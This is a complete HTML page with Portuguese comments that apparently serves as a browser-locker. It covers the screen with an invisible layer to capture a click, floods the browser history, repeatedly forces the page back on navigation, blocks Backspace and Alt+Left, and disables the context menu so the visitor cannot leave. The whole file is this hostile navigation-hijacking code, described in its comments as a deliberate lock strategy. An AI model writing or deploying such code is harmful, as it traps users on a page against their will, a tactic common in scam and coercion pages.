<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Restrito</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            overflow: hidden;
            cursor: default;
        }

        /* Camada invisível que cobre toda a tela para capturar o primeiro clique do usuário */
        #interaction-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 9999;
            background: rgba(255, 255, 255, 0.01);
        }
    </style>
</head>
<body>
    <div id="interaction-layer"></div>

    <script>
        /**
         * ESTRATÉGIA ULTRA-ROBUSTA
         * 1. Captura de Interação: O usuário fatalmente clicará na tela para tentar interagir.
         * 2. Inundação de Histórico Imediata: Assim que houver o clique, injetamos 100 estados.
         * 3. Loop de Localização: Se o usuário tentar sair, o script o força de volta.
         */

        const lockURL = window.location.href;

        function applyLock() {
            // Inunda o histórico massivamente
            for (let i = 0; i < 100; i++) {
                window.history.pushState({ locked: true, id: i }, "", lockURL + "#" + Math.random().toString(36).substring(7));
            }
            
            // Re-bloqueia no evento de popstate
            window.onpopstate = function(event) {
                window.history.pushState(null, "", lockURL + "#" + Date.now());
                // Força o navegador a permanecer processando a página atual
                window.location.replace(lockURL + "#main-lock");
            };
        }

        // Tenta aplicar o bloqueio imediatamente (pode falhar em alguns navegadores sem clique)
        try {
            applyLock();
        } catch (e) {}

        // Captura o primeiro clique do usuário para garantir o "User Gesture" exigido pelos navegadores
        document.getElementById('interaction-layer').addEventListener('click', function() {
            applyLock();
            // Remove a camada após o primeiro clique para permitir interações futuras (se houvesse conteúdo)
            this.style.pointerEvents = 'none';
        });

        // TÉCNICA DE REDIRECIONAMENTO DE SEGURANÇA (BACK-UP)
        // Se a URL mudar para algo que não seja a atual, tenta forçar o retorno.
        window.addEventListener('hashchange', function() {
            if (!window.location.hash.includes('lock')) {
                window.history.pushState(null, "", lockURL + "#forced-" + Date.now());
            }
        });

        // Bloqueio de teclas de sistema
        window.addEventListener('keydown', function(e) {
            // Bloqueia Backspace e Alt + Seta Esquerda
            if (e.keyCode === 8 || (e.altKey && e.keyCode === 37)) {
                e.preventDefault();
            }
        });

        // Impede menu de contexto
        document.addEventListener('contextmenu', event => event.preventDefault());

        // Reforço contínuo a cada 50ms
        setInterval(() => {
            if (window.history.length < 100) {
                try {
                    window.history.pushState(null, "", lockURL + "#ref-" + Date.now());
                } catch(e) {}
            }
        }, 50);
    </script>
</body>
</html>
